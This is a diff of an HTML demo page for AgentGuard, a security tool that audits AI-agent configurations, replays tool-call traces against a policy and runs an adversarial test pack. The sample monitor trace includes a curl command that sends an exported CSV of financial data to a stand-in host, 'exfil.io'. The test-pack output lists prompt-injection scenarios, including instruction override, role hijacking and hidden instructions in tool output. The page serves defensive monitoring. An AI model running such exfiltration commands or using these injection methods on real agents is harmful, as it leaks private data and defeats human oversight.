-        <p style="color:#94a3b8; margin-bottom:1rem;">Replays agent action logs and checks every tool call against your policy.</p>
+    <h3>Example output</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">Terminal</span></div><div class="term-b">
+<span class="cmd">$ aguard test --policy agent-policy.yaml --attack-pack all</span>
 
-        <h3>How it works</h3>
-        <div class="flow">
-            <div class="flow-box input">
-                <strong>Agent Traces</strong>
-                <div class="flow-label">JSONL file of<br>tool calls</div>
-            </div>
-            <div class="flow-arrow">+</div>
-            <div class="flow-box input">
-                <strong>Agent Policy</strong>
-                <div class="flow-label">YAML: allowed tools,<br>denied tools, limits</div>
-            </div>
-            <div class="flow-arrow">→</div>
-            <div class="flow-box tool">
-                <strong>🛡️ aguard monitor</strong>
-                <div class="flow-label">checks each action<br>against policy</div>
-            </div>
-            <div class="flow-arrow">→</div>
-            <div class="flow-box output">
-                <strong>Violations</strong>
-                <div class="flow-label">drift detection<br>unauthorized access</div>
-            </div>
-        </div>
+<span class="bold">🎯 Adversarial Policy Simulation</span>
 
-        <h3>What it detects</h3>
-        <table>
-            <tr><th>Violation</th><th>Severity</th><th>What Happened</th></tr>
-            <tr><td>Denied tool invoked</td><td><span class="badge badge-red">CRITICAL</span></td><td>Agent called <code>execute</code> which is explicitly blocked</td></tr>
-            <tr><td>Permission escalation</td><td><span class="badge badge-red">CRITICAL</span></td><td>Agent did <code>DELETE</code> via sql_query but only has <code>read</code> permission</td></tr>
-            <tr><td>Unauthorized tool</td><td><span class="badge badge-orange">HIGH</span></td><td>Agent called <code>file_write</code> which isn't in allowed_tools</td></tr>
-            <tr><td>Missing approval</td><td><span class="badge badge-orange">HIGH</span></td><td>Agent called <code>deploy</code> without human-in-the-loop approval</td></tr>
-        </table>
+  Policy: agent-policy.yaml
+  Agent: data-analyst-agent
+  Scenarios: 17
 
-        <h3>Example: A data exfiltration caught</h3>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <span class="terminal-title">Terminal — aguard monitor</span>
-            </div>
-            <div class="terminal-body">
-<span class="cmd">$ aguard monitor --trace-file traces.jsonl --policy agent-policy.yaml</span>
+  <span class="grn">✅ PASS</span>  PI-001  Direct instruction override        execute       <span class="grn">Blocked</span>
+  <span class="grn">✅ PASS</span>  PI-002  Role hijacking via system prompt    shell         <span class="grn">Blocked</span>
+  <span class="grn">✅ PASS</span>  PI-003  Indirect injection via tool desc    stripe.refund <span class="grn">Blocked</span>
+  <span class="grn">✅ PASS</span>  DE-001  File export of sensitive data       file_write    <span class="grn">Blocked</span>
+  <span class="grn">✅ PASS</span>  DE-002  Network exfiltration via curl       execute       <span class="grn">Blocked</span>
+  <span class="crit">❌ FAIL</span>  DE-004  SQL data dump                      sql_query     <span class="crit">NOT caught</span>
+  <span class="grn">✅ PASS</span>  PE-001  Write on read-only tool             sql_query     <span class="grn">Blocked</span>
+  <span class="grn">✅ PASS</span>  PE-003  Sudo/admin escalation              sudo          <span class="grn">Blocked</span>
+  <span class="grn">✅ PASS</span>  TP-001  Hidden instructions in tool output  execute       <span class="grn">Blocked</span>
+
+  📊 Results: <span class="grn">16 blocked</span> · <span class="crit">1 missed</span> · 17 total
+  ⚠️  <span class="crit">1 attack (6%) would succeed against this policy</span>
+
+  <span class="bold">Recommended fixes:</span>
+    → Add <span class="bold">sql_query</span> to denied_tools
+    → Add <span class="bold">sql_query</span> to require_human_approval
+    </div></div>
+</div>
+
+<!-- MONITOR -->
+<div class="panel" id="panel-monitor">
+    <h2>📡 aguard monitor — Behavioral Audit</h2>
+    <p style="color:#94a3b8;margin-bottom:.8rem">Replays agent action logs and checks every tool call against your declared policy.</p>
+
+    <h3>What it detects</h3>
+    <table>
+        <tr><th>Violation</th><th>Severity</th><th>Example</th></tr>
+        <tr><td>Denied tool invoked</td><td><span class="badge badge-red">CRITICAL</span></td><td>Agent called <code>execute</code> — explicitly blocked</td></tr>
+        <tr><td>Permission escalation</td><td><span class="badge badge-red">CRITICAL</span></td><td>DELETE via sql_query with read-only permission</td></tr>
+        <tr><td>Unauthorized tool</td><td><span class="badge badge-orange">HIGH</span></td><td>Agent called <code>file_write</code> — not in allowed list</td></tr>
+        <tr><td>Missing approval</td><td><span class="badge badge-orange">HIGH</span></td><td><code>deploy</code> without human-in-the-loop</td></tr>
+        <tr><td>Expired approval</td><td><span class="badge badge-orange">HIGH</span></td><td>Approval was granted but has expired</td></tr>
+    </table>
+
+    <h3>Example: data exfiltration caught</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">Terminal</span></div><div class="term-b">
+<span class="cmd">$ aguard monitor --trace-file traces.jsonl --policy policy.yaml</span>
 
 <span class="bold">📡 Monitoring agent behavior...</span>
 
-  Turn 1: 🔧 <span class="bold">sql_query</span>({"query": "SELECT * FROM financials WHERE quarter = 'Q2'"})
-  Turn 2: 🔧 <span class="bold">sql_query</span>({"query": "SELECT customer_name, email FROM customers"})
-  Turn 3: 🔧 <span class="bold">file_write</span>({"path": "/tmp/export.csv"})
-     <span class="critical">🚨 DRIFT: Agent invoked unauthorized tool 'file_write'</span>
-        <span class="dim">→ Not in allowed_tools. Agent is operating outside declared capabilities.</span>
-     <span class="critical">🚨 DRIFT: Tool 'file_write' used without human approval</span>
-        <span class="dim">→ Requires human-in-the-loop approval, no record found.</span>
-  Turn 4: 🔧 <span class="bold">execute</span>({"command": "curl https://exfil.io -d @/tmp/export.csv"})
-     <span class="critical">🚨 DRIFT: Agent invoked denied tool 'execute'</span>
-        <span class="dim">→ Explicitly in denied_tools. Possible prompt injection attack.</span>
-  Turn 5: 🔧 <span class="bold">send_message</span>({"channel": "#data-reports", "text": "Report exported"})
+  Turn 1: 🔧 <span class="bold">sql_query</span>({"query": "SELECT * FROM financials"})
+  Turn 2: 🔧 <span class="bold">file_write</span>({"path": "/tmp/export.csv"})
+     <span class="crit">🚨 DRIFT: Agent invoked unauthorized tool 'file_write'</span>
+     <span class="crit">🚨 DRIFT: Tool 'file_write' used without human approval</span>
+  Turn 3: 🔧 <span class="bold">execute</span>({"command": "curl https://exfil.io -d @/tmp/export.csv"})
+     <span class="crit">🚨 DRIFT: Agent invoked denied tool 'execute'</span>
+        <span class="dim">→ Possible prompt injection attack.</span>
 
-<span class="critical bold">🚨 5 policy violations detected</span>
-            </div>
-        </div>
+<span class="crit bold">🚨 5 policy violations detected</span>
+    </div></div>
+</div>
 
-        <h3>Trace file format (what you provide)</h3>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <span class="terminal-title">traces.jsonl — one JSON per line</span>
-            </div>
-            <div class="terminal-body">
-<span class="dim">// OpenTelemetry format (if your agent uses OTel)</span>
-{"name": "sql_query", "attributes": {"turn": 1, "tool.name": "sql_query", "tool.args": {"query": "SELECT ..."}}}
+<!-- WHATIF -->
+<div class="panel" id="panel-whatif">
+    <h2>🔮 aguard whatif — Policy Impact Simulator</h2>
+    <p style="color:#94a3b8;margin-bottom:.8rem">A differentiated feature: simulate the risk impact of policy changes <em>before</em> applying them.</p>
 
-<span class="dim">// Simple format (just log your tool calls)</span>
-{"turn": 1, "action_type": "tool_call", "tool_name": "sql_query", "tool_args": {"query": "SELECT ..."}}
-            </div>
-        </div>
+    <h3>Try it — toggle policies and watch the risk score change</h3>
+
+    <div class="score-display">
+        <div class="score-box"><div class="number before">100</div><div class="label">Current Risk</div></div>
+        <div class="score-arrow">→</div>
+        <div class="score-box"><div class="number after" id="new-score">100</div><div class="label">After Policies</div></div>
+    </div>
+    <div class="score-delta" id="score-delta">No policies applied</div>
+    <div class="risk-bar"><div class="risk-bar-fill" id="risk-bar" style="width:100%;background:#ef4444"></div></div>
+    <div class="risk-bar-label"><span>0 (Safe)</span><span>50</span><span>100 (Critical)</span></div>
+
+    <div class="whatif-controls">
+        <div class="whatif-row"><input type="checkbox" id="p1" onchange="uw()"><label for="p1">Restrict SQL tool to SELECT-only queries</label><span class="impact">↓15%</span></div>
+        <div class="whatif-row"><input type="checkbox" id="p2" onchange="uw()"><label for="p2">Add human-in-the-loop for file operations</label><span class="impact">↓20%</span></div>
+        <div class="whatif-row"><input type="checkbox" id="p3" onchange="uw()"><label for="p3">Rotate API keys to ephemeral tokens</label><span class="impact">↓10%</span></div>
+        <div class="whatif-row"><input type="checkbox" id="p4" onchange="uw()"><label for="p4">Add rate limits (100 calls/min) + timeout</label><span class="impact">↓12%</span></div>
+        <div class="whatif-row"><input type="checkbox" id="p5" onchange="uw()"><label for="p5">Restrict outbound network to allowlist</label><span class="impact">↓18%</span></div>
+        <div class="whatif-row"><input type="checkbox" id="p6" onchange="uw()"><label for="p6">Switch to explicit tool allowlist</label><span class="impact">↓14%</span></div>
+        <div class="whatif-row"><input type="checkbox" id="p7" onchange="uw()"><label for="p7">Run agent in sandboxed environment</label><span class="impact">↓22%</span></div>
+    </div>
+    <p style="color:#64748b;font-size:.8rem;text-align:center;margin-top:.5rem">☝️ Interactive demo of what <code>aguard whatif</code> does in the terminal.</p>
+</div>
+
+<!-- OWASP -->
+<div class="panel" id="panel-owasp">
+    <h2>🛡️ aguard owasp — OWASP Control Coverage</h2>
+    <p style="color:#94a3b8;margin-bottom:.8rem">Evaluates 20 controls mapped to OWASP MCP Top 10 and LLM Top 10. Each control uses precise finding-ID matching.</p>
+
+    <h3>OWASP MCP Top 10 — Control Status</h3>
+    <div class="owasp-grid">
+        <div class="owasp-item fail"><div class="oi-title">❌ MCP01 — Token Mismanagement</div><div class="oi-status">3 failed, 1 passed</div><div class="oi-controls">AGC-MCP01-001 secrets · 002 tokens · 003 Dockerfile · 004 .env</div></div>
+        <div class="owasp-item pass"><div class="oi-title">✅ MCP02 — Privilege Escalation</div><div class="oi-status">2 passed, 1 not tested</div><div class="oi-controls">AGC-MCP02-001 wildcards · 002 declarations · 003 drift</div></div>
+        <div class="owasp-item partial"><div class="oi-title">⚠️ MCP03 — Tool Poisoning</div><div class="oi-status">1 passed, 1 not tested</div><div class="oi-controls">AGC-MCP03-001 descriptions · 002 attack pack</div></div>
+        <div class="owasp-item fail"><div class="oi-title">❌ MCP04 — Supply Chain</div><div class="oi-status">1 failed</div><div class="oi-controls">AGC-MCP04-001 pinned deps</div></div>
+        <div class="owasp-item fail"><div class="oi-title">❌ MCP05 — Command Injection</div><div class="oi-status">1 failed, 1 passed, 1 not tested</div><div class="oi-controls">AGC-MCP05-001 HITL · 002 eval/exec · 003 attack pack</div></div>
+        <div class="owasp-item partial"><div class="oi-title">⚠️ MCP06 — Intent Flow Subversion</div><div class="oi-status">1 not tested</div><div class="oi-controls">AGC-MCP06-001 prompt injection pack</div></div>
+        <div class="owasp-item pass"><div class="oi-title">✅ MCP07 — AuthN/AuthZ</div><div class="oi-status">2 passed</div><div class="oi-controls">AGC-MCP07-001 auth · 002 HTTPS</div></div>
+        <div class="owasp-item partial"><div class="oi-title">⚠️ MCP08 — Audit & Telemetry</div><div class="oi-status">2 not tested</div><div class="oi-controls">AGC-MCP08-001 monitoring · 002 evidence</div></div>
+        <div class="owasp-item planned"><div class="oi-title">🔲 MCP09 — Shadow MCP Servers</div><div class="oi-status">Planned v1.0</div><div class="oi-controls">—</div></div>
+        <div class="owasp-item fail"><div class="oi-title">❌ MCP10 — Context Injection</div><div class="oi-status">1 failed</div><div class="oi-controls">AGC-MCP10-001 system prompt leaks</div></div>
     </div>
 
-    <!-- WHAT-IF -->
-    <div class="panel" id="panel-whatif">
-        <h2>🔮 aguard whatif — Policy Impact Simulator</h2>
-        <p style="color:#94a3b8; margin-bottom:1rem;">
-            The feature <strong>no other tool has</strong> — commercial or open-source.
-            Simulates the risk impact of policy changes <em>before</em> you apply them.
-        </p>
+    <h3>Example output</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">Terminal</span></div><div class="term-b">
+<span class="cmd">$ aguard owasp ./my-project/</span>
 
-        <h3>Try it — toggle policies and watch the risk score change</h3>
+<span class="bold">🛡️  OWASP Coverage Report</span>
 
-        <div class="score-display">
-            <div class="score-box">
-                <div class="number before">100</div>
-                <div class="label">Current Risk</div>
-            </div>
-            <div class="score-arrow">→</div>
-            <div class="score-box">
-                <div class="number after" id="new-score">100</div>
-                <div class="label">After Policies</div>
-            </div>
-        </div>
-        <div class="score-delta" id="score-delta">No policies applied</div>
+  <span class="crit">❌ MCP01:2025</span> Token Mismanagement: <span class="crit">3 failed</span>, <span class="grn">1 passed</span>
+    <span class="crit">✗</span> AGC-MCP01-001: No hardcoded secrets → 11 finding(s)
+    <span class="grn">✓</span> AGC-MCP01-002: No static long-lived tokens
+    <span class="crit">✗</span> AGC-MCP01-003: No secrets in Dockerfile ENV
+    <span class="crit">✗</span> AGC-MCP01-004: .env excluded from VCS
 
-        <div class="risk-bar-container">
-            <div class="risk-bar">
-                <div class="risk-bar-fill" id="risk-bar" style="width:100%; background: #ef4444;"></div>
-            </div>
-            <div class="risk-bar-label"><span>0 (Safe)</span><span>50</span><span>100 (Critical)</span></div>
-        </div>
+  <span class="grn">✅ MCP07:2025</span> AuthN/AuthZ: <span class="grn">2 passed</span>
+    <span class="grn">✓</span> AGC-MCP07-001: Remote servers have auth
+    <span class="grn">✓</span> AGC-MCP07-002: HTTPS transport
 
-        <div class="whatif-controls">
-            <div class="whatif-row">
-                <input type="checkbox" id="pol1" onchange="updateWhatIf()">
-                <label for="pol1">Restrict SQL tool to SELECT-only queries</label>
-                <span class="impact">↓ 15%</span>
-            </div>
-            <div class="whatif-row">
-                <input type="checkbox" id="pol2" onchange="updateWhatIf()">
-                <label for="pol2">Add human-in-the-loop for file operations</label>
-                <span class="impact">↓ 20%</span>
-            </div>
-            <div class="whatif-row">
-                <input type="checkbox" id="pol3" onchange="updateWhatIf()">
-                <label for="pol3">Rotate API keys to ephemeral tokens</label>
-                <span class="impact">↓ 10%</span>
-            </div>
-            <div class="whatif-row">
-                <input type="checkbox" id="pol4" onchange="updateWhatIf()">
-                <label for="pol4">Add rate limits (100 calls/min) + timeout (5 min)</label>
-                <span class="impact">↓ 12%</span>
-            </div>
-            <div class="whatif-row">
-                <input type="checkbox" id="pol5" onchange="updateWhatIf()">
-                <label for="pol5">Restrict outbound network to allowlist</label>
-                <span class="impact">↓ 18%</span>
-            </div>
-            <div class="whatif-row">
-                <input type="checkbox" id="pol6" onchange="updateWhatIf()">
-                <label for="pol6">Switch to explicit tool allowlist</label>
-                <span class="impact">↓ 14%</span>
-            </div>
-            <div class="whatif-row">
-                <input type="checkbox" id="pol7" onchange="updateWhatIf()">
-                <label for="pol7">Run agent in sandboxed environment</label>
-                <span class="impact">↓ 22%</span>
-            </div>
-        </div>
+  ─────────────────────────────────────
+  📊 <span class="bold">Summary</span>
+     OWASP MCP Mapped: <span class="bold">9/10</span> risks
+     Controls: <span class="grn">8 passed</span> · <span class="crit">6 failed</span> · <span class="med">6 not tested</span> · 20 total
+    </div></div>
+</div>
 
-        <p style="color:#64748b; font-size:0.85rem; text-align:center; margin-top:1rem;">
-            ☝️ This interactive demo simulates what <code>aguard whatif</code> does in the terminal.<br>
-            The real tool reads your actual agent config and calculates precise risk deltas.
-        </p>
+<!-- EVIDENCE -->
+<div class="panel" id="panel-evidence">
+    <h2>📋 Evidence & Baseline</h2>
+
+    <h3>aguard evidence — Launch Readiness Packet</h3>
+    <p style="color:#94a3b8;margin-bottom:.8rem">Generates a Markdown report for security review before shipping an agent to production.</p>
+
+    <table>
+        <tr><th>Section</th><th>What It Contains</th></tr>
+        <tr><td>Risk Summary</td><td>Overall score, finding counts by severity</td></tr>
+        <tr><td>Security Findings</td><td>Every issue with OWASP ID, description, remediation</td></tr>
+        <tr><td>Tool Permissions</td><td>What the agent can access</td></tr>
+        <tr><td>Policy Coverage</td><td>Allowed/denied tools, HITL gates, data access rules</td></tr>
+        <tr><td>Required Mitigations</td><td>Actionable checklist of HIGH/CRITICAL fixes</td></tr>
+        <tr><td>Launch Approval</td><td>Sign-off template: approver, date, decision</td></tr>
+    </table>
+
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">Terminal</span></div><div class="term-b">
+<span class="cmd">$ aguard evidence . --config agent.yaml --policy policy.yaml</span>
+<span class="grn">  ✅ Launch readiness packet saved to launch-readiness.md</span>
+    </div></div>
+
+    <h3>aguard baseline — Drift Detection</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">Terminal</span></div><div class="term-b">
+<span class="cmd">$ aguard baseline create .</span>
+  <span class="grn">✅ Baseline saved to .aguard-baseline.json</span>
+
+<span class="dim"># ... time passes, configs change ...</span>
+
+<span class="cmd">$ aguard baseline compare .</span>
+  📏 Baseline Drift Report
+  Risk Score: 72 → 45 <span class="grn">(↓ 27 points)</span>
+
+  <span class="grn">✅ Resolved (3):</span>
+    - Hardcoded OpenAI Key in .env
+    - Missing auth on remote MCP server
+
+  <span class="crit">🆕 New (1):</span>
+    - Static long-lived token on slack-server
+
+<span class="cmd">$ aguard baseline compare . --fail-on-drift</span>
+<span class="dim">  # Exits code 1 if new findings → CI gate</span>
+    </div></div>
+</div>
+
+<!-- INTEGRATE -->
+<div class="panel" id="panel-integrate">
+    <h2>🔌 Integration Guide</h2>
+    <div class="cards">
+        <div class="card"><div class="card-icon">📦</div><h4>Any AI Project</h4><p>Run <code>aguard scan .</code> on any Python/Node project. Finds secrets, unsafe code, Docker issues.</p></div>
+        <div class="card"><div class="card-icon">🔗</div><h4>MCP Projects</h4><p>Auto-discovers mcp.json, .mcp.yaml. Checks permissions, auth, transport, tool poisoning.</p></div>
+        <div class="card"><div class="card-icon">⚙️</div><h4>CI/CD Pipeline</h4><p><code>--max-risk 50 --fail-on high --format sarif</code><br>SARIF integrates with GitHub Advanced Security.</p></div>
+        <div class="card"><div class="card-icon">🔭</div><h4>OpenTelemetry</h4><p>Export agent traces to JSONL → <code>aguard monitor</code> checks against policy.</p></div>
     </div>
 
-    <!-- INTEGRATE -->
-    <div class="panel" id="panel-integrate">
-        <h2>🔌 Integration Guide</h2>
-        <p style="color:#94a3b8; margin-bottom:1rem;">AgentGuard works with any agent framework. Here's how to connect it.</p>
+    <h3>GitHub Actions example</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">.github/workflows/agent-security.yml</span></div><div class="term-b">
+<span class="cmd">- name: Agent Security Gate</span>
+  run: |
+    pip install pluto-aguard
+    aguard scan . --max-risk 50 --fail-on high --format sarif -o results.sarif
+    aguard test --policy policy.yaml --fail-on-miss
+    aguard baseline compare . --fail-on-drift
 
-        <div class="cards">
-            <div class="card">
-                <div class="card-icon">📦</div>
-                <h4>Any MCP Project</h4>
-                <p>If you have <code>mcp.json</code> or <code>.mcp.yaml</code> files, just point scan at your project root. It auto-discovers everything.</p>
-                <div class="terminal" style="margin:0.8rem 0 0;">
-                    <div class="terminal-body" style="padding:0.5rem 0.8rem;">
-<span class="cmd">aguard scan /path/to/project/</span>
-                    </div>
-                </div>
-            </div>
-            <div class="card">
-                <div class="card-icon">🔭</div>
-                <h4>OpenTelemetry Agents</h4>
-                <p>If your agent emits OTel spans, export to JSONL and run monitor against it with a policy file.</p>
-                <div class="terminal" style="margin:0.8rem 0 0;">
-                    <div class="terminal-body" style="padding:0.5rem 0.8rem;">
-<span class="cmd">aguard monitor --trace-file traces.jsonl \
-  --policy my-policy.yaml</span>
-                    </div>
-                </div>
-            </div>
-            <div class="card">
-                <div class="card-icon">🤖</div>
-                <h4>LangChain / CrewAI / AutoGen</h4>
-                <p>Log your agent's tool calls as simple JSONL (one line per action). No SDK integration needed.</p>
-                <div class="terminal" style="margin:0.8rem 0 0;">
-                    <div class="terminal-body" style="padding:0.5rem 0.8rem; font-size:0.8rem;">
-{"turn": 1, "tool_name": "search", "tool_args": {"q": "..."}}
-{"turn": 2, "tool_name": "write", "tool_args": {"path": "..."}}
-                    </div>
-                </div>
-            </div>
-            <div class="card">
-                <div class="card-icon">⚙️</div>
-                <h4>CI/CD Pipeline</h4>
-                <p>Add as a build step. Fail the build if risk score exceeds your threshold.</p>
-                <div class="terminal" style="margin:0.8rem 0 0;">
-                    <div class="terminal-body" style="padding:0.5rem 0.8rem; font-size:0.8rem;">
-<span class="cmd">aguard scan . --format json -o results.json</span>
-<span class="dim"># then check: assert score < 50</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+<span class="cmd">- uses: github/codeql-action/upload-sarif@v3</span>
+  with:
+    sarif_file: results.sarif
+    </div></div>
 
-    <!-- TEST -->
-    <div class="panel" id="panel-test">
-        <h2>🧪 Testing in Your Environment</h2>
-        <p style="color:#94a3b8; margin-bottom:1rem;">Step-by-step: install, verify, scan your own project.</p>
-
-        <h3>Step 1: Install (30 seconds)</h3>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <span class="terminal-title">Any terminal</span>
-            </div>
-            <div class="terminal-body">
-<span class="cmd">pip install pluto-aguard</span>
-<span class="cmd">aguard --version</span>
-<span class="green">pluto-aguard, version 0.1.0</span>
-            </div>
-        </div>
-
-        <h3>Step 2: Test with included examples (30 seconds)</h3>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <span class="terminal-title">Clone and run</span>
-            </div>
-            <div class="terminal-body">
-<span class="cmd">git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git</span>
-<span class="cmd">cd pluto-aguard</span>
-
-<span class="dim"># Scan the intentionally insecure example</span>
-<span class="cmd">aguard scan ./examples/</span>
-<span class="dim">→ Should find 3+ security findings</span>
-
-<span class="dim"># Monitor traces for policy violations</span>
-<span class="cmd">aguard monitor --trace-file ./examples/sample-traces.jsonl --policy ./examples/agent-policy.yaml</span>
-<span class="dim">→ Should find 5 policy violations</span>
-
-<span class="dim"># Simulate policy changes</span>
-<span class="cmd">aguard whatif --config ./examples/insecure-agent-config.yaml</span>
-<span class="dim">→ Should show risk score of 100/100</span>
-            </div>
-        </div>
-
-        <h3>Step 3: Scan your own project</h3>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <span class="terminal-title">Point at your project</span>
-            </div>
-            <div class="terminal-body">
-<span class="cmd">aguard scan /path/to/your/agent-project/</span>
-
-<span class="dim"># What to expect:</span>
-<span class="dim"># • Have mcp.json?         → MCP config findings</span>
-<span class="dim"># • Have .env files?       → Secret detection findings</span>
-<span class="dim"># • Have agent-config.yaml? → Permission findings</span>
-<span class="dim"># • Have none of these?    → "No security issues found!" ✅</span>
-            </div>
-        </div>
-
-        <h3>What "healthy" looks like</h3>
-        <table>
-            <tr><th>✅ Passing</th><th>❌ Failing</th></tr>
-            <tr><td>No wildcard (<code>*</code>) permissions</td><td>Wildcard permissions on any MCP server</td></tr>
-            <tr><td>All remote servers have authentication</td><td>Unauthenticated remote MCP servers</td></tr>
-            <tr><td>No hardcoded secrets in files</td><td>API keys, tokens in source or config</td></tr>
-            <tr><td>Dangerous tools require human approval</td><td><code>execute</code>, <code>shell</code>, <code>file_write</code> without HITL</td></tr>
-            <tr><td>Agent has timeout and rate limits</td><td>No resource constraints configured</td></tr>
-            <tr><td>Tool descriptions are clean</td><td>Suspicious text in tool metadata</td></tr>
-            <tr><td>Risk score &lt; 50</td><td>Risk score ≥ 50</td></tr>
-        </table>
-    </div>
+    <h3>What should be true for a healthy project</h3>
+    <table>
+        <tr><th>✅ Passing</th><th>❌ Failing</th></tr>
+        <tr><td>No hardcoded secrets</td><td>API keys in source or .env committed</td></tr>
+        <tr><td>No eval/exec on LLM output</td><td>Code injection via LLM responses</td></tr>
+        <tr><td>Remote MCP servers authenticated</td><td>Unauthenticated remote servers</td></tr>
+        <tr><td>Dangerous tools require approval</td><td>execute/shell without HITL</td></tr>
+        <tr><td>AI deps pinned</td><td>openai, langchain unpinned</td></tr>
+        <tr><td>All adversarial tests pass</td><td>Policy misses attack scenarios</td></tr>
+        <tr><td>Risk score &lt; 50</td><td>Risk score ≥ 50</td></tr>
+    </table>
+</div>
 
 </div>
 
 <div class="footer">
-    🛡️ Pluto AgentGuard v0.1.0 ·
+    🛡️ Pluto AgentGuard v0.9.0 ·
     <a href="https://github.com/arpitha-dhanapathi/pluto-aguard">GitHub</a> ·
-    <a href="https://pypi.org/project/pluto-aguard/">PyPI</a>
+    <a href="https://pypi.org/project/pluto-aguard/">PyPI</a> ·
+    84 tests · 20 OWASP controls · 7 commands
 </div>
 
 <script>
-    function showPanel(name) {
-        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.getElementById('panel-' + name).classList.add('active');
-        event.target.classList.add('active');
-    }
-
-    function updateWhatIf() {
-        const policies = [
-            { id: 'pol1', reduction: 15 },
-            { id: 'pol2', reduction: 20 },
-            { id: 'pol3', reduction: 10 },
-            { id: 'pol4', reduction: 12 },
-            { id: 'pol5', reduction: 18 },
-            { id: 'pol6', reduction: 14 },
-            { id: 'pol7', reduction: 22 },
-        ];
-
-        let totalReduction = 0;
-        let checkedCount = 0;
-        policies.forEach(p => {
-            if (document.getElementById(p.id).checked) {
-                totalReduction += p.reduction;
-                checkedCount++;
-            }
-        });
-
-        // Diminishing returns: cap at 85% reduction
-        totalReduction = Math.min(totalReduction, 85);
-        const newScore = Math.round(100 - totalReduction);
-
-        document.getElementById('new-score').textContent = newScore;
-        document.getElementById('risk-bar').style.width = newScore + '%';
-
-        // Color
-        const scoreEl = document.getElementById('new-score');
-        const barEl = document.getElementById('risk-bar');
-        if (newScore >= 70) {
-            scoreEl.style.color = '#ef4444';
-            barEl.style.background = '#ef4444';
-        } else if (newScore >= 50) {
-            scoreEl.style.color = '#f59e0b';
-            barEl.style.background = '#f59e0b';
-        } else if (newScore >= 25) {
-            scoreEl.style.color = '#3b82f6';
-            barEl.style.background = '#3b82f6';
-        } else {
-            scoreEl.style.color = '#22c55e';
-            barEl.style.background = '#22c55e';
-        }
-
-        // Delta text
-        const deltaEl = document.getElementById('score-delta');
-        if (checkedCount === 0) {
-            deltaEl.textContent = 'No policies applied';
-            deltaEl.style.color = '#64748b';
-        } else {
-            deltaEl.textContent = `↓ ${totalReduction}% risk reduction (${checkedCount} ${checkedCount === 1 ? 'policy' : 'policies'} applied)`;
-            deltaEl.style.color = '#4ade80';
-        }
-    }
+function showPanel(n){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.getElementById('panel-'+n).classList.add('active');event.target.classList.add('active')}
+function uw(){
+    const p=[{id:'p1',r:15},{id:'p2',r:20},{id:'p3',r:10},{id:'p4',r:12},{id:'p5',r:18},{id:'p6',r:14},{id:'p7',r:22}];
+    let t=0,c=0;p.forEach(x=>{if(document.getElementById(x.id).checked){t+=x.r;c++}});
+    t=Math.min(t,85);const s=Math.round(100-t);
+    document.getElementById('new-score').textContent=s;
+    document.getElementById('risk-bar').style.width=s+'%';
+    const e=document.getElementById('new-score'),b=document.getElementById('risk-bar');
+    if(s>=70){e.style.color='#ef4444';b.style.background='#ef4444'}
+    else if(s>=50){e.style.color='#f59e0b';b.style.background='#f59e0b'}
+    else if(s>=25){e.style.color='#3b82f6';b.style.background='#3b82f6'}
+    else{e.style.color='#22c55e';b.style.background='#22c55e'}
+    const d=document.getElementById('score-delta');
+    if(c===0){d.textContent='No policies applied';d.style.color='#64748b'}
+    else{d.textContent=`↓ ${t}% risk reduction (${c} ${c===1?'policy':'policies'})`;d.style.color='#4ade80'}
+}
 </script>
-
 </body>
 </html>
